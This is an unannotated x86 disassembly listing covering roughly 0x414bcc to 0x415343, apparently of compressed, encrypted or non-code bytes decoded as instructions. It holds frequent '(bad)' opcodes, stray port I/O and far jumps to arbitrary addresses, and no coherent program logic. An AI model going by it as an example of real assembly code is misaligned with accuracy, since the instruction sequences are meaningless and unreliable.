  414bcc:	jl     0x414b4e
  414bce:	xchg   esi,eax
  414bcf:	xchg   ebx,eax
  414bd0:	mov    esi,DWORD PTR [ecx+0x25]
  414bd3:	pop    ds
  414bd4:	fstp   TBYTE PTR [esi+eiz*2]
  414bd7:	mov    dh,0xcb
  414bd9:	out    dx,al
  414bda:	fst    QWORD PTR [ebp+0x61924eaf]
  414be0:	inc    esp
  414be1:	xor    cl,ch
  414be3:	dec    ebx
  414be4:	out    0x97,eax
  414be6:	aad    0xda
  414be8:	fidiv  WORD PTR [ebp+0x28]
  414beb:	ds cmp eax,0x8673b648
  414bf1:	jmp    0x890c370d
  414bf6:	fist   WORD PTR [esi]
  414bf8:	dec    edi
  414bf9:	pop    es
  414bfa:	add    ah,dl
  414bfc:	jb     0x414c53
  414bfe:	addr16 and eax,0xdb8fbeb4
  414c04:	add    ecx,DWORD PTR ds:0x37ce6e40
  414c0a:	push   esp
  414c0b:	out    dx,al
  414c0c:	(bad)  
  414c0e:	outs   dx,DWORD PTR ds:[esi]
  414c0f:	mov    esi,DWORD PTR [edi+0x42]
  414c12:	inc    ebp
  414c13:	fdivr  DWORD PTR [edi+0x16]
  414c16:	xor    eax,DWORD PTR [ebp+0x77aee048]
  414c1c:	mov    bh,0xc0
  414c1e:	out    dx,al
  414c1f:	scas   al,BYTE PTR es:[edi]
  414c20:	int3   
  414c21:	dec    edx
  414c22:	test   edx,esi
  414c24:	imul   ebx,DWORD PTR [eax-0x5be3fd69],0xfe4d6ad0
  414c2e:	jae    0x414cad
  414c30:	pop    esi
  414c31:	aas    
  414c32:	cmp    esi,edx
  414c34:	and    eax,0x78037391
  414c39:	jle    0x414bc0
  414c3b:	push   0xef113f99
  414c40:	cli    
  414c41:	adc    edx,DWORD PTR [eax-0x74cd7b7a]
  414c47:	pushaw 
  414c49:	in     eax,dx
  414c4a:	mov    ds:0xb3b25a5a,al
  414c4f:	jle    0x414cc9
  414c51:	popa   
  414c52:	push   0xfffffff2
  414c54:	jno    0x414c76
  414c56:	jp     0x414c4a
  414c58:	xchg   ecx,eax
  414c59:	std    
  414c5a:	lods   al,BYTE PTR ds:[esi]
  414c5b:	mov    ?,eax
  414c5d:	test   BYTE PTR [ebx+0x5f],cl
  414c60:	aaa    
  414c61:	add    ecx,DWORD PTR [ecx+ebx*8]
  414c64:	lahf   
  414c65:	sbb    BYTE PTR [ebp+0x34],bl
  414c68:	sbb    bh,bh
  414c6a:	cs add eax,0x69583c52
  414c70:	jg     0x414cf0
  414c72:	pop    ds
  414c73:	test   DWORD PTR [edx],esi
  414c75:	mov    BYTE PTR [ecx-0x7dec43e5],cl
  414c7b:	js     0x414cb1
  414c7d:	or     BYTE PTR [esi],dh
  414c7f:	lock mov esi,0xf42d907f
  414c85:	xor    eax,0xaa3983da
  414c8a:	sub    dh,bl
  414c8c:	std    
  414c8d:	or     ch,BYTE PTR [esi-0xe]
  414c90:	inc    eax
  414c91:	or     al,0xb3
  414c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c94:	loope  0x414cc0
  414c96:	jbe    0x414c6a
  414c98:	cmp    eax,0x8e888337
  414c9d:	sahf   
  414c9e:	cld    
  414c9f:	xchg   ebx,eax
  414ca0:	mov    al,0x46
  414ca2:	(bad)  
  414ca3:	dec    esp
  414ca4:	repnz xchg ebp,eax
  414ca6:	mov    al,0x11
  414ca8:	adc    al,0x14
  414caa:	and    DWORD PTR [eax+0x69248ada],ebp
  414cb0:	push   es
  414cb1:	sub    eax,ecx
  414cb3:	cmc    
  414cb4:	mov    ds:0xaa8517e5,eax
  414cb9:	dec    ecx
  414cba:	xor    bh,ch
  414cbc:	out    dx,eax
  414cbd:	mov    eax,ds:0x4b8b107e
  414cc2:	std    
  414cc3:	xchg   edx,eax
  414cc4:	dec    ecx
  414cc5:	loope  0x414ce4
  414cc7:	xchg   edx,eax
  414cc8:	adc    BYTE PTR [ebx+edx*2],0xcf
  414ccc:	mov    eax,0x8ab69dc2
  414cd1:	push   0xd
  414cd3:	sbb    eax,0x92843b2a
  414cd8:	or     ecx,DWORD PTR [edx]
  414cda:	jno    0x414c87
  414cdc:	int    0x3a
  414cde:	stos   DWORD PTR es:[edi],eax
  414cdf:	cli    
  414ce0:	mov    ecx,0xc316cbab
  414ce5:	paddsb mm3,QWORD PTR [ecx+eax*4+0x4d]
  414cea:	inc    edx
  414ceb:	dec    esi
  414cec:	lahf   
  414ced:	call   0x12b08c5
  414cf2:	aas    
  414cf3:	or     eax,0x61c673f1
  414cf8:	inc    edi
  414cf9:	ja     0x414ca2
  414cfb:	ins    BYTE PTR es:[edi],dx
  414cfc:	cs int3 
  414cfe:	test   BYTE PTR [eax+0x24],0x3b
  414d02:	mov    edi,0x1609cb2f
  414d07:	jnp    0x414d03
  414d09:	xor    eax,0x667a04cc
  414d0e:	cmp    eax,0x4fb14b73
  414d13:	shl    ebx,cl
  414d15:	not    BYTE PTR [edx+0x77]
  414d18:	inc    BYTE PTR [eax]
  414d1a:	enter  0xd913,0x44
  414d1e:	xor    BYTE PTR [esi+edx*8],0xd2
  414d22:	les    ebp,FWORD PTR [eax+0x51829f8f]
  414d28:	test   DWORD PTR [edi+0x3d4346eb],eax
  414d2e:	mov    bh,0xf2
  414d30:	fcom   QWORD PTR [edi]
  414d32:	push   cs
  414d33:	dec    esi
  414d34:	mov    ebx,ecx
  414d36:	mov    al,0x99
  414d38:	mov    edi,0xd2f49df8
  414d3d:	imul   edx,edi,0x1d45588a
  414d43:	mov    es,WORD PTR [esi]
  414d45:	out    0x55,al
  414d47:	cmp    al,0x72
  414d49:	inc    eax
  414d4a:	(bad)  
  414d4c:	and    edx,DWORD PTR ds:0x44fdcac8
  414d52:	inc    esi
  414d53:	push   eax
  414d54:	clc    
  414d55:	mov    dh,0x66
  414d57:	pop    edx
  414d58:	cmp    bh,al
  414d5a:	jp     0x414da9
  414d5c:	xchg   BYTE PTR [ebx],ah
  414d5e:	pushf  
  414d5f:	lds    edx,FWORD PTR [eax+edx*8+0x71baeeb9]
  414d66:	and    ch,dh
  414d68:	mov    cl,BYTE PTR [ebx-0x16dc56c0]
  414d6e:	jle    0x414d1d
  414d70:	or     al,0xd9
  414d72:	adc    esp,DWORD PTR [edi-0x2f1b4abd]
  414d78:	cwde   
  414d79:	mov    ebx,0xc5d7b9c8
  414d7e:	push   ebp
  414d7f:	ss maskmovq mm1,(bad)
  414d81:	test   DWORD PTR [edx],0x38f3a711
  414d87:	jnp    0x414dc0
  414d89:	or     ecx,DWORD PTR [edx-0x19]
  414d8c:	mov    cl,0x75
  414d8e:	scas   al,BYTE PTR es:[edi]
  414d8f:	in     eax,dx
  414d90:	sbb    ecx,esp
  414d92:	jae    0x414dd3
  414d94:	lods   eax,DWORD PTR ds:[esi]
  414d95:	jne    0x414d32
  414d97:	sbb    BYTE PTR [esi-0x5dea158c],0x7c
  414d9e:	xchg   esp,ebx
  414da0:	leave  
  414da1:	lds    ecx,FWORD PTR [edx]
  414da3:	shr    ebx,1
  414da5:	add    eax,DWORD PTR [ecx+0x72]
  414da8:	lea    ebx,[eax]
  414daa:	jg     0x414d46
  414dac:	pop    edx
  414dad:	lods   al,BYTE PTR ds:[esi]
  414dae:	pop    ss
  414daf:	inc    eax
  414db0:	push   ss
  414db1:	push   edx
  414db2:	popf   
  414db3:	lods   eax,DWORD PTR ds:[esi]
  414db4:	(bad)  
  414db5:	jnp    0x414dfe
  414db7:	test   eax,0x4494f415
  414dbc:	add    al,0x17
  414dbe:	push   ds
  414dbf:	pop    ss
  414dc0:	outs   dx,DWORD PTR ds:[esi]
  414dc1:	dec    edx
  414dc2:	add    BYTE PTR [edx-0x39fc7ecb],al
  414dc8:	in     eax,dx
  414dc9:	pop    esi
  414dca:	mov    al,0xfc
  414dcc:	inc    edx
  414dcd:	sub    edx,DWORD PTR [edx+0xbc1508]
  414dd3:	jmp    0x8f1ac5b4
  414dd8:	push   ss
  414dd9:	mov    ch,0xc3
  414ddb:	cmp    al,0x91
  414ddd:	xor    esi,DWORD PTR [ecx+0x6ebf51e]
  414de3:	push   eax
  414de4:	je     0x414d91
  414de6:	repnz xchg edx,eax
  414de8:	das    
  414de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dea:	loop   0x414dc7
  414dec:	jo     0x414e20
  414dee:	lahf   
  414def:	xchg   esp,eax
  414df0:	fadd   st,st(1)
  414df2:	das    
  414df3:	ss jmp 0x1c91952e
  414df9:	mov    ecx,0xb4817911
  414dfe:	cs push ebp
  414e00:	xchg   edi,eax
  414e01:	lea    ebx,[eax+0x24]
  414e04:	mov    ah,0xd1
  414e06:	imul   ebp,esi,0x3b
  414e09:	xor    DWORD PTR [ebp+0x3102cfb0],edx
  414e0f:	cmp    DWORD PTR [edx+0x7bf84814],eax
  414e15:	or     al,dh
  414e17:	pop    edi
  414e18:	add    al,0x82
  414e1a:	push   eax
  414e1b:	cli    
  414e1c:	(bad)  
  414e1d:	popf   
  414e1e:	jg     0x414e8d
  414e20:	jg     0x414dc7
  414e22:	xlat   BYTE PTR ds:[ebx]
  414e23:	xchg   ebx,eax
  414e24:	add    cl,dh
  414e26:	rcl    DWORD PTR [edi-0x2114ac58],1
  414e2c:	inc    edx
  414e2d:	stos   DWORD PTR es:[edi],eax
  414e2e:	sbb    eax,0x15031dd3
  414e33:	je     0x414e64
  414e35:	xor    eax,0x420ce5c9
  414e3a:	sbb    eax,0x3cd24343
  414e3f:	add    eax,0x334a643
  414e44:	mov    al,0x2f
  414e46:	mov    esi,0x5dee37b
  414e4b:	sar    ecx,0x5
  414e4e:	pop    ecx
  414e4f:	ins    BYTE PTR es:[edi],dx
  414e50:	inc    edx
  414e52:	sub    bl,BYTE PTR [eax+ebx*2-0x58]
  414e56:	rol    DWORD PTR [esi+0x3f],1
  414e59:	stc    
  414e5a:	repz and dh,BYTE PTR [ecx]
  414e5d:	popf   
  414e5e:	inc    eax
  414e5f:	sbb    eax,0xde95aad5
  414e64:	mov    bh,0xd0
  414e66:	xchg   edx,eax
  414e67:	pop    ds
  414e68:	mov    eax,ds:0x85bc5a42
  414e6d:	push   eax
  414e6e:	sbb    BYTE PTR [edi+0x7384398a],bh
  414e74:	out    dx,al
  414e75:	sub    eax,0x51acda00
  414e7a:	jbe    0x414e82
  414e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e7d:	cdq    
  414e7e:	mov    eax,0xad5c24bc
  414e83:	jg     0x414e05
  414e85:	sbb    BYTE PTR [esi+0x7f],al
  414e88:	cdq    
  414e89:	add    bh,bl
  414e8b:	int    0x3f
  414e8d:	(bad)  
  414e8f:	xchg   ecx,eax
  414e90:	shl    BYTE PTR [esi+0x471df1cf],1
  414e96:	cmp    al,BYTE PTR [ebx+0xcdbe3e0]
  414e9c:	sbb    esp,edi
  414e9e:	mov    bl,0xcd
  414ea0:	ss xchg ebp,eax
  414ea2:	xchg   ebp,eax
  414ea3:	jo     0x414e31
  414ea5:	or     DWORD PTR [ebx],esi
  414ea7:	js     0x414ec0
  414ea9:	adc    al,0x14
  414eab:	cli    
  414eac:	leave  
  414ead:	push   ds
  414eae:	pop    esi
  414eaf:	push   cs
  414eb0:	push   ss
  414eb1:	(bad)  
  414eb2:	fidiv  DWORD PTR [edx+0x19]
  414eb5:	xor    edx,DWORD PTR [ebx]
  414eb7:	icebp  
  414eb8:	stos   BYTE PTR es:[edi],al
  414eb9:	jecxz  0x414e9c
  414ebb:	xor    esp,edi
  414ebd:	add    eax,0x3b95c0d8
  414ec2:	sbb    ebp,edi
  414ec4:	push   esp
  414ec5:	jbe    0x414ef1
  414ec7:	fdivr  st,st(0)
  414ec9:	retf   0x4d68
  414ecc:	xchg   edi,eax
  414ecd:	mov    WORD PTR [edi+0x364151e3],gs
  414ed3:	rol    BYTE PTR [ecx+0x33],cl
  414ed6:	sbb    cl,dh
  414ed8:	jecxz  0x414ec3
  414eda:	ins    DWORD PTR es:[edi],dx
  414edb:	or     BYTE PTR [ecx-0x58],cl
  414ede:	cmc    
  414edf:	mov    bh,BYTE PTR [eax+0x788d14e2]
  414ee5:	inc    ecx
  414ee6:	loop   0x414e92
  414ee8:	mov    dh,0x5c
  414eea:	adc    al,0x46
  414eec:	dec    esp
  414eed:	data16 fnstcw WORD PTR [ebx]
  414ef0:	or     dl,BYTE PTR [esi]
  414ef2:	das    
  414ef3:	push   0x4d000d03
  414ef8:	add    al,0x4
  414efa:	jb     0x414ef3
  414efc:	leave  
  414efd:	in     eax,dx
  414efe:	ins    BYTE PTR es:[edi],dx
  414eff:	call   0xa42e:0x5112f4d6
  414f06:	std    
  414f07:	scas   al,BYTE PTR es:[edi]
  414f08:	jmp    0x676dd5aa
  414f0d:	fxch   st(4)
  414f0f:	daa    
  414f10:	das    
  414f11:	or     al,0xd0
  414f13:	push   ebx
  414f14:	rcr    BYTE PTR [edi],1
  414f16:	gs inc edx
  414f18:	retf   
  414f19:	sub    edx,DWORD PTR [ecx+0x75938a15]
  414f1f:	daa    
  414f20:	jle    0x414eee
  414f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f23:	adc    DWORD PTR [edi],edi
  414f25:	xor    ebp,ebx
  414f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f28:	mov    ds:0x103781af,eax
  414f2d:	xchg   esp,eax
  414f2e:	loop   0x414f49
  414f30:	rcl    bl,cl
  414f32:	not    DWORD PTR [ebx-0x2b]
  414f35:	cmp    DWORD PTR [esi-0xb0ed77b],ebx
  414f3b:	sub    al,BYTE PTR [eax-0x2531d235]
  414f41:	push   ebx
  414f42:	ret    0xfe41
  414f45:	xor    edi,esp
  414f47:	push   0xeb535ca2
  414f4c:	push   0xe5e249b6
  414f51:	jbe    0x414efa
  414f53:	xchg   DWORD PTR [eax],esi
  414f55:	gs leave 
  414f57:	dec    eax
  414f58:	mov    dl,0xc5
  414f5a:	xchg   ebp,eax
  414f5b:	xchg   esi,eax
  414f5c:	inc    ebx
  414f5d:	ins    BYTE PTR es:[edi],dx
  414f5e:	lahf   
  414f5f:	dec    ebx
  414f60:	cdq    
  414f61:	mov    esp,0x6467b5c7
  414f66:	ret    
  414f67:	dec    edi
  414f68:	outs   dx,BYTE PTR ds:[esi]
  414f69:	sub    BYTE PTR [eax-0x3dd5158],al
  414f6f:	fwait
  414f70:	sbb    al,0x71
  414f72:	mov    al,ds:0x907c3e63
  414f77:	push   ecx
  414f78:	icebp  
  414f79:	mov    ah,0xfc
  414f7b:	jge    0x414f81
  414f7d:	xor    DWORD PTR [edx+esi*8-0x71cfe2eb],esi
  414f84:	and    BYTE PTR [esp+ebx*2+0x27],ah
  414f88:	pop    edi
  414f89:	push   es
  414f8a:	into   
  414f8b:	repz or eax,0xe179c3eb
  414f91:	shr    edx,1
  414f93:	stos   DWORD PTR es:[edi],eax
  414f94:	mov    bl,0x27
  414f96:	push   edi
  414f97:	es inc edx
  414f99:	push   ss
  414f9a:	pushf  
  414f9b:	(bad)  
  414f9c:	int    0x4d
  414f9e:	adc    eax,0x143ca24b
  414fa3:	call   0xca4a:0x58725496
  414faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fab:	retf   
  414fac:	imul   DWORD PTR [ebx]
  414fae:	cs ja  0x414f65
  414fb1:	popa   
  414fb2:	mov    bl,0x2d
  414fb4:	cmp    al,0xe5
  414fb6:	retf   0x1e9c
  414fb9:	mov    es,WORD PTR [eax+0x5a]
  414fbc:	push   ss
  414fbd:	inc    ecx
  414fbe:	sti    
  414fbf:	xor    al,0xed
  414fc1:	fdiv   QWORD PTR [eax-0x3c46526d]
  414fc7:	xlat   BYTE PTR ds:[ebx]
  414fc8:	(bad)  
  414fca:	xor    BYTE PTR [ecx],0x1
  414fcd:	adc    al,0x7b
  414fcf:	xlat   BYTE PTR ds:[ebx]
  414fd0:	nop
  414fd1:	or     ah,BYTE PTR [edi]
  414fd3:	mov    bl,0x36
  414fd5:	jno    0x414f92
  414fd7:	inc    esp
  414fd8:	mov    edx,0xae6aebfb
  414fdd:	stos   DWORD PTR es:[edi],eax
  414fde:	fst    QWORD PTR [ecx]
  414fe0:	loopne 0x415035
  414fe2:	xchg   ecx,eax
  414fe3:	adc    DWORD PTR [edi+0x29],ebp
  414fe6:	lock icebp 
  414fe8:	iret   
  414fe9:	cld    
  414fea:	xchg   ebx,eax
  414feb:	aaa    
  414fec:	mov    ecx,0x5f207560
  414ff1:	scas   eax,DWORD PTR es:[edi]
  414ff2:	cmp    al,0xb4
  414ff4:	into   
  414ff5:	xchg   BYTE PTR [edx-0x79],ah
  414ff8:	repz in eax,dx
  414ffa:	in     al,0x9b
  414ffc:	add    DWORD PTR [ebp-0x44],0x20
  415000:	jb     0x414fdb
  415002:	popa   
  415003:	mov    eax,ds:0xeba4fb31
  415008:	mov    eax,0xcbd2c97c
  41500d:	sbb    al,0x67
  41500f:	sbb    al,0x54
  415011:	mov    ds:0x4778203e,eax
  415016:	mov    WORD PTR [esi-0x28],cs
  415019:	jmp    0x1a04:0xd3c602dc
  415020:	push   edi
  415021:	xor    DWORD PTR [ecx+eiz*1],ebx
  415024:	mov    ch,0x2a
  415026:	popa   
  415027:	adc    edx,edi
  415029:	test   al,0x39
  41502b:	or     edx,DWORD PTR [edx]
  41502d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41502e:	pop    eax
  41502f:	ins    DWORD PTR es:[edi],dx
  415030:	push   edi
  415031:	push   edi
  415032:	in     eax,0x87
  415034:	outs   dx,DWORD PTR ds:[esi]
  415035:	push   esp
  415036:	or     BYTE PTR [ecx],bl
  415038:	cmp    DWORD PTR [ecx+0x2bc7b668],eax
  41503e:	mov    ds:0xc17474f8,al
  415043:	aam    0x59
  415045:	ins    DWORD PTR es:[edi],dx
  415046:	ins    BYTE PTR es:[edi],dx
  415047:	fsincos 
  415049:	sub    esp,DWORD PTR [ecx-0x26dd5ee2]
  41504f:	mov    ecx,0xf868a4a8
  415054:	and    eax,0xb30f399b
  415059:	jmp    0x9a5c:0x28eb3801
  415060:	mov    esi,0x352036c0
  415065:	push   cs
  415066:	adc    BYTE PTR [eax+0x2dcfc17f],dh
  41506c:	cmp    DWORD PTR [eax],edi
  41506e:	inc    esi
  41506f:	push   0xffffffd6
  415071:	sbb    cl,BYTE PTR [eax-0x380255b7]
  415077:	xchg   DWORD PTR [esi],esi
  415079:	push   ecx
  41507a:	(bad)  
  41507b:	pop    ecx
  41507c:	lods   al,BYTE PTR ds:[esi]
  41507d:	and    DWORD PTR [esi-0x5ff08773],edx
  415083:	popa   
  415084:	jecxz  0x415102
  415086:	in     al,dx
  415087:	dec    edi
  415088:	in     al,dx
  415089:	add    BYTE PTR [eax+0x4c],ah
  41508c:	xor    al,BYTE PTR [esi+0x57]
  41508f:	aaa    
  415090:	or     esp,DWORD PTR [edi-0x2c239e7a]
  415096:	sar    al,1
  415098:	xor    al,0x19
  41509a:	outs   dx,DWORD PTR ds:[esi]
  41509b:	ss dec esp
  41509d:	jge    0x41508c
  41509f:	sti    
  4150a0:	jns    0x4150f4
  4150a2:	or     DWORD PTR [ebp+0xa],0x41
  4150a6:	jecxz  0x41508c
  4150a8:	loope  0x415039
  4150aa:	inc    ebp
  4150ab:	(bad)  
  4150ac:	jl     0x4150c5
  4150ae:	add    dl,BYTE PTR [ecx-0x13]
  4150b1:	pop    esp
  4150b2:	cmp    edx,0xf6ed692a
  4150b8:	dec    ebp
  4150b9:	ret    
  4150ba:	add    al,0xab
  4150bc:	mov    ds:0xa63f550f,eax
  4150c1:	clc    
  4150c2:	ret    
  4150c3:	(bad)  [edx]
  4150c5:	mul    BYTE PTR [esi]
  4150c7:	pop    eax
  4150c8:	out    dx,al
  4150c9:	push   eax
  4150ca:	mov    dl,0xae
  4150cc:	xlat   BYTE PTR ds:[ebx]
  4150cd:	test   al,0x5d
  4150cf:	push   esi
  4150d0:	int3   
  4150d1:	or     eax,0x6136c3f2
  4150d6:	test   BYTE PTR [ecx],dl
  4150d8:	rcr    DWORD PTR [edi+0x1d72d875],1
  4150de:	xchg   ebx,eax
  4150df:	int    0x47
  4150e1:	jecxz  0x415130
  4150e3:	push   ds
  4150e4:	int    0x61
  4150e6:	inc    ebp
  4150e7:	dec    esp
  4150e8:	mov    ch,0xee
  4150ea:	dec    ecx
  4150eb:	xlat   BYTE PTR ds:[ebx]
  4150ec:	gs or  al,0x42
  4150ef:	(bad)  [eax+eiz*1]
  4150f2:	mov    edx,0xfc7c9f70
  4150f7:	cmc    
  4150f8:	loop   0x41516a
  4150fa:	imul   ebx,esi,0xffffffe9
  4150fd:	lock pushf 
  4150ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415100:	icebp  
  415101:	xor    eax,0x5b797966
  415106:	add    BYTE PTR [edi-0x59],bl
  415109:	dec    esp
  41510a:	pop    edi
  41510b:	jbe    0x415158
  41510d:	jp     0x4150ea
  41510f:	cmp    ebp,DWORD PTR [edi-0x72895032]
  415115:	nop
  415116:	lock enter 0x6fe7,0xf6
  41511b:	bound  edi,QWORD PTR ds:0xba6610b7
  415121:	push   ecx
  415122:	xchg   edi,eax
  415123:	loopne 0x415148
  415125:	lea    eax,[eax]
  415127:	fisub  DWORD PTR [esi+0x6a]
  41512a:	clc    
  41512b:	jae    0x4150b8
  41512d:	cdq    
  41512e:	popw   ds
  415130:	push   cs
  415131:	xlat   BYTE PTR ds:[ebx]
  415132:	test   al,ch
  415134:	and    eax,0xbdcf8a81
  415139:	add    al,dl
  41513b:	or     BYTE PTR [edi],bl
  41513d:	pusha  
  41513e:	in     eax,0xd0
  415140:	ss fcmovu st,st(4)
  415143:	mov    edi,0x3b5688f4
  415148:	push   ss
  415149:	pop    esi
  41514a:	pop    esp
  41514b:	mov    al,ds:0x4bb8c8c6
  415150:	scas   eax,DWORD PTR es:[edi]
  415151:	les    ebx,FWORD PTR [eax]
  415153:	call   0xe2c4:0x5cc07275
  41515a:	imul   edi,DWORD PTR [ebp-0x3b],0xbbaf2018
  415161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415162:	arpl   cx,bp
  415164:	xor    al,0xd9
  415166:	(bad)  
  415167:	dec    esi
  415168:	xor    eax,DWORD PTR [ecx]
  41516a:	xor    al,0x3d
  41516c:	and    BYTE PTR [eax],0x15
  41516f:	mov    eax,ds:0x891255d1
  415174:	xchg   esi,eax
  415175:	xlat   BYTE PTR ds:[ebx]
  415176:	sbb    ebp,edx
  415178:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41517a:	stos   DWORD PTR es:[edi],eax
  41517b:	in     eax,0xe
  41517d:	in     al,dx
  41517e:	loopne 0x41516a
  415180:	cmp    BYTE PTR [edx],ah
  415182:	daa    
  415183:	(bad)  
  415184:	fprem1 
  415186:	stc    
  415187:	rcr    BYTE PTR [edx+0x7355b45a],1
  41518d:	scas   eax,DWORD PTR es:[edi]
  41518e:	mov    al,0x35
  415190:	push   0x21a9de92
  415195:	int3   
  415196:	dec    ebx
  415197:	scas   eax,DWORD PTR es:[edi]
  415198:	jmp    0x967fc744
  41519d:	jecxz  0x4151cb
  41519f:	pop    edi
  4151a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a1:	pop    ebp
  4151a2:	stc    
  4151a3:	dec    esp
  4151a4:	sti    
  4151a5:	xchg   ebp,eax
  4151a6:	(bad)  
  4151a7:	mov    eax,ds:0x275e89d7
  4151ac:	cmp    esi,esp
  4151ae:	jp     0x4151c2
  4151b0:	or     eax,0xa982081f
  4151b5:	call   0xf0b5ccfd
  4151ba:	sbb    eax,0xcc4f4d3
  4151bf:	jle    0x4151fe
  4151c1:	adc    al,0x40
  4151c3:	stos   BYTE PTR es:[edi],al
  4151c4:	out    dx,al
  4151c5:	sar    BYTE PTR [ebx+0x225c7575],0x45
  4151cc:	es or  al,0x1
  4151cf:	shr    DWORD PTR ds:0xd7aba58d,1
  4151d5:	push   edi
  4151d6:	mov    edx,DWORD PTR [edx+0x73]
  4151d9:	jbe    0x4151ca
  4151db:	cmp    edi,0x4
  4151de:	jge    0x415165
  4151e0:	das    
  4151e1:	retf   
  4151e2:	mov    edx,0xba2f3c3
  4151e7:	cwde   
  4151e8:	fwait
  4151e9:	add    dh,dh
  4151eb:	xchg   ch,bh
  4151ed:	(bad)  
  4151ee:	sbb    ecx,ecx
  4151f0:	fwait
  4151f1:	jo     0x415192
  4151f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151f4:	xchg   edx,eax
  4151f5:	push   ecx
  4151f6:	push   esi
  4151f7:	outs   dx,BYTE PTR ds:[esi]
  4151f8:	rol    BYTE PTR [ecx-0x77d692d8],1
  4151fe:	sub    esp,DWORD PTR ss:[ecx-0x59]
  415202:	pop    ebp
  415203:	mov    al,0x2f
  415205:	jp     0x4151d9
  415207:	mov    esp,0xe0a876f2
  41520c:	test   al,0x61
  41520e:	xor    BYTE PTR [esp+eax*2+0x221f824],ah
  415215:	jo     0x415296
  415217:	nop
  415218:	faddp  st(5),st
  41521a:	stc    
  41521b:	lea    ebp,[ecx+eiz*4]
  41521e:	ror    edi,cl
  415220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415221:	push   ecx
  415222:	jns    0x4151c6
  415224:	shr    DWORD PTR [ebx+0x72],1
  415227:	ror    BYTE PTR [ebx-0x1883a65b],0xe7
  41522e:	sbb    eax,0x1b8de1fc
  415233:	add    al,0x38
  415235:	and    al,BYTE PTR [ecx+0x6889aecc]
  41523b:	jle    0x41529c
  41523d:	mov    bl,0x86
  41523f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415240:	sub    al,0x2e
  415242:	into   
  415243:	sbb    ebx,DWORD PTR [ebp+0x58096702]
  415249:	bswap  ecx
  41524b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41524c:	ror    DWORD PTR [ebp-0x33],0x78
  415250:	mov    WORD PTR ds:0xbad97ddb,fs
  415256:	and    al,0x6a
  415258:	cmp    al,0xaa
  41525a:	jecxz  0x41524e
  41525c:	jne    0x415265
  41525e:	sar    DWORD PTR [edx-0xc],cl
  415261:	sub    al,0x23
  415263:	add    bh,0x1b
  415266:	adc    al,0x44
  415268:	pop    ebp
  415269:	xor    BYTE PTR [esi+esi*1-0x7cb0063e],0x5a
  415271:	cmp    al,0x89
  415273:	xchg   edx,eax
  415274:	cdq    
  415275:	jp     0x415232
  415277:	add    BYTE PTR [eax-0x1b],dl
  41527a:	(bad)  
  41527b:	pop    ss
  41527c:	mov    ch,0x69
  41527e:	shl    BYTE PTR [esi],cl
  415280:	icebp  
  415281:	adc    dh,BYTE PTR [ecx+0x0]
  415284:	(bad)  
  415285:	pushf  
  415286:	inc    eax
  415287:	int    0xdc
  415289:	loope  0x4152a4
  41528b:	stos   BYTE PTR es:[edi],al
  41528c:	sbb    al,0x8d
  41528e:	adc    ch,cl
  415290:	fcom   QWORD PTR ds:0x9e7f5fda
  415296:	add    BYTE PTR [esi-0x23],bl
  415299:	jmp    0x2d07:0x5f01b80b
  4152a0:	jno    0x415227
  4152a2:	xchg   ecx,eax
  4152a3:	or     esi,DWORD PTR [ebp+0x2be363fb]
  4152a9:	xchg   ebx,eax
  4152aa:	inc    edx
  4152ab:	sbb    dh,BYTE PTR [eax]
  4152ad:	mov    BYTE PTR [ecx],al
  4152af:	imul   esp,DWORD PTR [ecx],0x62741635
  4152b5:	scas   eax,DWORD PTR es:[edi]
  4152b6:	fcomp  DWORD PTR [ebx]
  4152b8:	int3   
  4152b9:	inc    ebp
  4152ba:	call   0x885c:0x626be59e
  4152c1:	repnz push 0xd3419c8
  4152c7:	inc    eax
  4152c8:	(bad)  [ecx-0x2]
  4152cb:	xchg   esi,eax
  4152cc:	aaa    
  4152cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ce:	sub    BYTE PTR [ecx+ecx*2+0x68],0xf0
  4152d3:	mov    dl,0x1c
  4152d5:	(bad)  
  4152d6:	fdivr  DWORD PTR [edx]
  4152d8:	cli    
  4152d9:	in     al,dx
  4152da:	retf   
  4152db:	mov    ah,0x88
  4152dd:	pop    eax
  4152de:	inc    esi
  4152df:	push   cs
  4152e0:	mov    bh,0x2
  4152e2:	test   BYTE PTR [esi],ah
  4152e4:	mov    esp,0xaea7c1dc
  4152e9:	ins    BYTE PTR es:[edi],dx
  4152ea:	je     0x41530f
  4152ec:	push   edx
  4152ed:	add    esi,DWORD PTR [edx+0x2d]
  4152f0:	fwait
  4152f1:	call   0xd5af632a
  4152f6:	or     BYTE PTR [ebx-0x79],al
  4152f9:	adc    dl,dl
  4152fb:	cmc    
  4152fc:	mov    eax,0x5913bbfb
  415301:	js     0x41534b
  415303:	dec    ebx
  415304:	not    BYTE PTR [ebx]
  415306:	xchg   DWORD PTR [ebx-0x75c31969],ecx
  41530c:	jge    0x41535a
  41530e:	ss into 
  415310:	mov    cl,0x55
  415312:	push   ecx
  415313:	xchg   edx,eax
  415314:	push   edi
  415315:	es xchg ecx,eax
  415317:	stos   BYTE PTR es:[edi],al
  415318:	rol    DWORD PTR [ecx+ebx*2-0x6caec7e2],0x2b
  415320:	sub    DWORD PTR [edi-0x60],ebx
  415323:	xor    al,0x4d
  415325:	ror    BYTE PTR [ebx-0x23],0x7a
  415329:	lock fadd DWORD PTR [ebx+0x2581cd8d]
  415330:	sti    
  415331:	pop    es
  415332:	(bad)  [esi+0x7c50e8d3]
  415338:	mov    dh,BYTE PTR [eax-0x9]
  41533b:	inc    ecx
  41533c:	add    bh,BYTE PTR [bx-0x13ef]
  415341:	stc    
  415342:	in     al,dx
  415343:	dec    ebp
